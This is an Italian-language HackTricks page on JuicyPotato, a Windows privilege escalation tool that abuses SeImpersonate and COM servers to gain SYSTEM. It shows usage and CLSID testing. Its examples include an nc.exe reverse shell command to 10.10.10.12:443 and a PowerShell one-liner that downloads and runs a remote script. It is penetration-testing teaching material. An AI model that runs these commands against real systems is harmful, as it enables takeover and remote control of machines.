# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successivi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso a livello `NT AUTHORITY\SYSTEM`**. _**Controlla:**_

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abuso dei privilegi dorati) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Versione zuccherata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, cioè **un altro strumento di escalation dei privilegi locali, da un Windows Service Accounts a NT AUTHORITY\SYSTEM**_

#### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Riepilogo <a href="#summary" id="summary"></a>

[**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di escalation dei privilegi basata su [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [servizio](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) che ha il listener MiTM su `127.0.0.1:6666` e quando hai privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione della build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.

Abbiamo deciso di armare [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dì ciao a Juicy Potato**.

> Per la teoria, vedi [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.

Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo sfruttare. Devono solo:

1. essere istanziabili dall'utente corrente, normalmente un "utente di servizio" che ha privilegi di impersonificazione
2. implementare l'interfaccia `IMarshal`
3. essere eseguiti come utente elevato (SYSTEM, Amministratore, …)

Dopo alcuni test abbiamo ottenuto e testato un elenco esteso di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Dettagli succosi <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato ti consente di:

- **CLSID di destinazione** _scegli qualsiasi CLSID tu voglia._ [_Qui_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare l'elenco organizzato per OS._
- **Porta di ascolto COM** _definisci la porta di ascolto COM che preferisci (anziché il 6666 hardcoded)_
- **Indirizzo IP di ascolto COM** _collega il server a qualsiasi IP_
- **Modalità di creazione del processo** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
- `CreateProcessWithToken` (richiede `SeImpersonate`)
- `CreateProcessAsUser` (richiede `SeAssignPrimaryToken`)
- `entrambi`
- **Processo da avviare** _avvia un eseguibile o uno script se lo sfruttamento ha successo_
- **Argomento del processo** _personalizza gli argomenti del processo avviato_
- **Indirizzo del server RPC** _per un approccio furtivo puoi autenticarti a un server RPC esterno_
- **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
- **Modalità TEST** _principalmente per scopi di test, cioè testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il test_](http://ohpe.it/juicy-potato/Test/)

### Utilizzo <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Pensieri finali <a href="#final-thoughts" id="final-thoughts"></a>

[**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora sei **SYSTEM**.

È quasi impossibile prevenire l'abuso di tutti questi COM Server. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.

La soluzione reale è proteggere gli account e le applicazioni sensibili che vengono eseguiti sotto gli account `* SERVICE`. Fermare `DCOM` inibirebbe certamente questo exploit, ma potrebbe avere un impatto serio sul sistema operativo sottostante.

Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Esempi

Nota: Visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per un elenco di CLSID da provare.

### Ottieni una shell inversa nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Avvia un nuovo CMD (se hai accesso RDP)

![](<../../images/image (300).png>)

## Problemi con CLSID

Spesso, il CLSID predefinito che JuicyPotato utilizza **non funziona** e l'exploit fallisce. Di solito, ci vogliono più tentativi per trovare un **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per un sistema operativo specifico, dovresti visitare questa pagina:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Controllo dei CLSID**

Prima, avrai bisogno di alcuni eseguibili oltre a juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, e scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quel script creerà un elenco di possibili CLSID da testare.

Poi scarica [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(cambia il percorso per l'elenco CLSID e per l'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID, e **quando il numero di porta cambia, significherà che il CLSID ha funzionato**.

**Controlla** i CLSID funzionanti **utilizzando il parametro -c**

## Riferimenti

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

{{#include ../../banners/hacktricks-training.md}}
